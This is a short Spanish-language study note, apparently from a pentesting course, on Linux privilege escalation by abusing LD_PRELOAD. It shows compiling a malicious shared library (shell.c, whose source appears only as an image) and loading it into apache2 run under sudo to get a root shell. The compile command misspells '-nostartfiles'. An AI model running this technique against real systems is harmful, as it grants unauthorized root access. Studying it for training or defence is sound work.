
Son como DLL pero para linux. Archivos que contienen fragmento de código y que pueden ser cargados por varios binarios.

La idea es crear un Shared library malicioso y cargarlo en un binario.

Ejemplo.

![[Pasted image 20250224092159.png]]

Como se puede ver el usuario student tiene acceso a ejecutar el apache2 como sudo y que puede utilizar la variable de entorno de LD_PRELOAD.

Vamos a crear un shared library llamada shell.c

![[Pasted image 20250224092534.png]]

Ahora se tiene que compilar.

```bash
gcc -fPIC -shared -o shell.so shell.c -nostratfiles

#vamos a ejecutar como root apache2 aprovechando la variable de entorno y el shared library.
sudo LD_PRELOAD=/home/student/shell.so apache2
```

![[Pasted image 20250224092846.png]]
